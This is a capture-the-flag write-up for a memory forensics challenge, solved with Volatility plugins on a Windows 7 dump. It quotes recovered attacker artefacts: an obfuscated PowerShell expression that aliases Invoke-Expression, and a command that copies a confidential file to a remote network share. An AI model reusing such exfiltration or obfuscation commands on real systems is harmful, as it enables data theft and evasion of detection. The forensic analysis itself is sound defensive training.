# Recollection
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c18c9fa8-036f-4af8-935b-71b53fa33dc9)


## Lessons Learned:
- Using volatility to do RAM forensic.
- Identifying an alias attempt for IEX (Invoke Expression).

## SCENARIO:
A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. 
We believe it may have been compromised & have managed to retrieve a memory dump of the asset. 
We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. 
Please answer the questions below.

## STEPS:
1. In this challenge we're tasked to do a memory forensic from a memory dump to identify what actions carried out by the attacker and checks what assets might be affected.

> 1ST QUESTION --> ANS: Windows 7

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b206c191-cfd4-48c5-9b58-142beae6064e)


2. To do RAM forensic, first we need to identify the correct profile. We can use volatility to identify it using plugin **imageinfo**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7d9386a2-3ae4-4989-aaf7-eea4ec3523a6)


3. The first suggested profile usually is the correct one and judging from the result we can identify that the operating system of the machine is **Windows** and the version is **7**.

> 2ND QUESTION --> ANS: `2022-12-19 16:07:30`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bde732fb-5090-4130-9155-e59af34c4bbf)


4. Few info shown simply by using plugin **imageinfo**. The time when the memory dump created is specify at the **Image data and time** header.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c69a04a6-d6dd-4b6f-98d0-197a52840a6c)



> 3RD QUESTION --> ANS: `(gv '*MDR*').naMe[3,11,2]-joIN''`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d6277fb4-1096-413f-beac-6bbda85d01b4)


5. To identify data saved on the clipboard, in volatility2 we can use **clipboard** plugin.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/319a3198-d582-476c-867d-04708c92bd39)


6. Noticed the first data shown is kinda obfuscated, this could indicate the obfuscated mentioned at the questions.
7. To make sure that this is the copied command, we can use **cmdscan** plugin to check what command executed on the poweshell.exe process.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ce9988ae-f96f-4aa8-a788-8ca1b93837c0)


8. Based from the result above, we can identify that the command is executed both in cmd and powershell. It's valid then, that the copied command is our interest.

> 4TH QUESTION --> ANS: Invoke-Expression

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8dee0847-91b7-41b0-9305-ec976561fd5b)


9. Took me a while to identify the targeted powershell cmdlet. I used **consoles** plugin to check the result of the executed obfuscated command.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e04d8fbe-1294-4ca3-8790-a2f6dfbd4352)


10. Interesting it's resulting to **iex**, searching on the internet about **iex** found that **iex** stands for **Invoke Expressions**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d09b4843-b673-4589-b9cb-c706ca19a6c9)


#### NOTES:

```
What is IEX?
EX stands for "Invoke-Expression" in PowerShell. It's a cmdlet used to run a string as a PowerShell command. This means it allows PowerShell scripts to dynamically execute code stored in a string variable. It's a powerful feature but can also pose security risks if used improperly, as it enables dynamic execution of potentially malicious commands

Attacker tried to set an alias for IEX, this could be an attempt to obfuscate malicious PowerShell commands. By creating an alias for Invoke-Expression, an attacker may make it harder for security tools or analysts to detect and understand the true nature of the executed code
```

11. The article visited shows the obfuscated command that is similiar with what the attacker send.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9925ac30-ea5d-496f-83d1-22056d1085c1)


12. It's clear that the attacker tried to set an alias for **Invoke Expression** cmdlet.

> 5TH QUESTION --> ANS: `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8685233d-1834-4426-98a0-9cb2afe2ea39)


13. Analyzing the CMD history, we can identify an attempt of the attacker to exfiltrate the content of the **Confidential.txt** to his file named **pass.txt** inside **pulice** directory.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5d0f93a1-208f-4537-93da-2b893a60c555)


> 6TH QUESTION --> ANS: NO

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/da73e2fb-557c-4841-ac27-0ec8df50bb3b)


14. Anyway, the exfiltration is failed because the program path was not found.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b386cc11-6820-4fec-aae1-0a50edf20f0c)


> 7TH QUESTION --> ANS: `C:\Users\Public\Office\readme.txt`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8962f6b2-47b0-43fe-bf87-37389cf8afde)


15. Analyzing the terminal history furthermore, we can identify there an encodede messages.

 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1bb9ff56-71da-485f-b83a-5a370fe5993a)

16. After decoded the message we can identify the full path of the readme file.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c18233ff-0469-4d2b-8f06-0082efd6a08c)


> 8TH QUESTION --> ANS: USER-PC

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/82aedfbf-4d94-47f0-807f-a5c71fd1f00f)


17. To check hostname in windows, we can run --> **net users**.
18. Based from the terminal history, the hostname of the compromised system is `USER-PC`.
19. Anyway, there is an alternate way to check the machine's hostname. Simply dump the registry key.
20. First we need to find the offset of **\REGISTRY\MACHINE\SYSTEM**. In volatility to list registry keys we can use plugin **hivelist**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/314141d5-107b-45fe-914a-2df10d576c61)


21. Next, to dump the registry key we can use plugin **printkey**.

```
printkey -o 0xfffff8a000024010 -K "ControlSet001\Control\ComputerName\ComputerName"
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e6334582-c6b0-4c75-86a4-bb2a9a08c017)


> 9TH QUESTION --> ANS: 3

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/216d4aa9-c65b-49fa-b982-729707aace9c)


22. To identify total user accounts were in the machine we can run **hashdump** plugin.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/79a4c625-189e-4a37-aabb-ff9e092e1015)


23. Based from the results, we can conclude that there were 3 users registered.

> 10TH QUESTION --> ANS: `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a267ab2c-6c2a-48f4-955c-ee4483942076)


24. To identify full location path, we can use **filescan** plugin and filter for **passwords.txt**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/74790f11-e375-45b9-a52c-3a770250b59e)


> 11TH QUESTION --> ANS: b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/17f08389-3aae-44c1-afbc-246b0962e5eb)


25. By analyzing the results of **console** plugin, we can identify an executeable file with a hash lookalike values as it's name.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d6f7b550-8f8f-4517-bb4a-c1f83c43631f)


26. To verify that it is the malicious file, remembering the filename is the hash value of itself, then we can use it to virustotal to check whether the executeable file is a malware or not.

> RESULT IN VIRUSTOTAL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2035ecfb-e055-4986-a86c-cb179acc0110)


27. It is indeed what we're looking for.

> 12TH QUESTION --> ANS: d3b592cd9481e4f053b5362e22d61595 

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/806b20de-cdf6-477a-9ed0-aa8441aaa570)


28. We can simply open the details tab in virustotal to check for imphash value.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/aa98a762-472f-4db5-9d8e-1ed924175952)


#### NOTES:

```
What is imphash value?
An imphash (import hash) value is a hash function generated from the characteristics of a binary executable file's imported functions.
It is commonly used in digital forensics and malware analysis to quickly identify and compare different versions or instances of executable
files based on their imported functions. The imphash value remains consistent for files that share similar import tables,
making it a useful tool for identifying and grouping related files.
```

> 13TH QUESTION --> ANS: `2022-06-22 11:49:04`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b643844b-32b7-41be-ba93-66a07d9e45af)


29. Again, we can use virustotal to check the creation time of the malicious executeable file.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/22d08c28-153b-4567-84a7-5828fc7dc8c4)


> 14TH QUESTIOM --> ANS: `192.168.0.104`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/efa3420a-8ad4-4376-bb99-c1ead9eae52d)


30. To identify local ip address of the machine, we can use **netscan** plugin.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2ff00375-5256-442a-a2cc-9e684c0ece56)


31. Based from the result above, it's clear that `192.168.0.104` is the local ip address of the machine, because it listens to `0.0.0.0`.


> 15TH QUESTION --> ANS: cmd.exe

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ae56ce46-fa25-4c54-bfa4-61c206980d2b)


32. To identify the parent process of the **powershell.exe** process which is a child process, we can use plugin **pstree** to list all the process and it's child process.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/78a3ac25-a13b-4132-b959-7d142eee84b1)


33. Based from the result above, we can conclude that **cmd.exe** is the parent process.

> 16TH QUESTION --> ANS: mafia_code1337@gmail.com

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/316f936d-35d7-4643-a960-c626e0f28a6a)


34. Things to note, the attacker should use a browser to login a social media, hence we just need to dump the memory of the browser exe file.
35. Based from the previous **pslist** result, we identified only one browser used. The microsoft edge.
36. In volatility, we can dump that using plugin **memmap**.

```
python3 ../../volatility3/vol.py -f recollection.bin -o . windows.memmap --dump --pid 2380
```

37. Then, let's strings the .dmp file and search for **.gmail.com**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3a6042e2-493f-45f4-8e14-6f3224a93425)


38. Noticed, we found a **.gmail.com** account and a URL encoded data.
39. Upon decode the URL, it's clear that **mafia_code1337@gmail.com** is used for login.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a7db485a-8d7a-448b-be8a-ac20ab32d871)


> 17TH QUESTION --> ANS:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9a9c3b94-43a7-44a1-b7f9-5eb8cac0d83d)


> 18TH QUESTION --> ANS:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b8400da6-5b77-4217-98d7-4b90de761802)


## IMPORTANT LINKS

```
https://www.securonix.com/blog/hiding-the-powershell-execution-flow/
```
